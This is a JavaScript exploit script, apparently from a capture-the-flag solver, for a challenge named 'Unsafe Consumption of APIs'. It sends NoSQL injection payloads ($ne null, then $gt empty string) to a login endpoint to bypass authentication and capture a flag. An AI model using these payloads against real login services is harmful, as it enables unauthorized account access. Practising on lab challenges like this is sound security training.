/**
 * Challenge: 0xaa - Unsafe Consumption of APIs
 * Exploit: NoSQL injection in login endpoint
 */

const { createLogger, httpRequest, extractFlag } = require('../utils');

async function run(token, baseUrl, testUser, testPass) {
    const { log, saveFlag } = createLogger('0xaa');
    log('Starting 0xaa exploit: Unsafe Consumption of APIs');

    // NoSQL injection: use $ne (not equal) operator to bypass authentication
    log('Attempting NoSQL injection in login endpoint...');
    const nosqlPayload = {
        username: { $ne: null },
        password: { $ne: null },
    };

    log(`Payload: ${JSON.stringify(nosqlPayload)}`);
    const result = await httpRequest(`${baseUrl}/api/login`, {
        method: 'POST',
        body: JSON.stringify(nosqlPayload),
    });

    log(`Injection response: ${JSON.stringify(result.data)}`);

    // Check if we got a token (authentication bypassed)
    if (result.data && (result.data.token || result.data.status === 'success')) {
        log('✅ NoSQL injection successful - authentication bypassed');
        
        // Check if flag is in response
        const flag = extractFlag(JSON.stringify(result.data));
        if (flag) {
            saveFlag(flag);
            return { success: true, flag };
        }
        return { success: true };
    } else {
        log('⚠️  NoSQL injection may not have worked as expected');
        log(`Response: ${JSON.stringify(result.data)}`);
        
        // Try alternative payload
        log('Trying alternative NoSQL injection payload...');
        const altPayload = {
            username: { $gt: '' },
            password: { $gt: '' },
        };
        const altResult = await httpRequest(`${baseUrl}/api/login`, {
            method: 'POST',
            body: JSON.stringify(altPayload),
        });
        log(`Alternative response: ${JSON.stringify(altResult.data)}`);
        
        return { success: false };
    }
}

module.exports = { run };
